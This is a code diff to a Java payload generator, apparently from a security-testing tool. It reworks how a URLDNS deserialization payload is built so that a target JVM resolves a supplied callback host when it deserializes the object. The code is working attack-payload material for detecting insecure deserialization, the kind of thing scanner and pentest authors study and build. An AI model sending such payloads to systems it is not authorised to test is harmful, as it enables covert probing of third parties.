@@ -4,7 +4,8 @@ import java.io.*;
 import java.lang.reflect.*;
 import java.math.BigInteger;
 import java.net.URL;
-import java.lang.reflect.Field;
+import java.net.URLConnection;
+import java.net.URLStreamHandler;
 import java.rmi.registry.Registry;
 import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObjectInvocationHandler;
@@ -218,18 +219,22 @@ public final class JavaPayloads {
 
     private static byte[] generateUrldns(String callbackUrl) throws Exception {
         String target = toValidUrl(callbackUrl);
-        URL url = new URL(target);
+        URL url = new URL(null, target, new URLStreamHandler() {
+            @Override
+            protected URLConnection openConnection(URL u) throws IOException {
+                throw new IOException("payload URL must never be opened during generation");
+            }
 
-        // Prevent DNS during put() — set hashCode to any value != -1
-        java.lang.reflect.Field hashCodeField = URL.class.getDeclaredField("hashCode");
-        hashCodeField.setAccessible(true);
-        hashCodeField.setInt(url, 0xCAFE);
+            @Override
+            protected int hashCode(URL u) {
+                // URL keeps -1 as the uncached sentinel. The handler is transient,
+                // so the target JVM restores its normal handler and resolves on read.
+                return -1;
+            }
+        });
 
         HashMap<URL, String> hashMap = new HashMap<>();
         hashMap.put(url, "omnistrike");
-
-        // Reset to -1 so deserialization triggers hashCode() → DNS lookup
-        hashCodeField.setInt(url, -1);
 
         return ReflectionUtils.serialize(hashMap);
     }
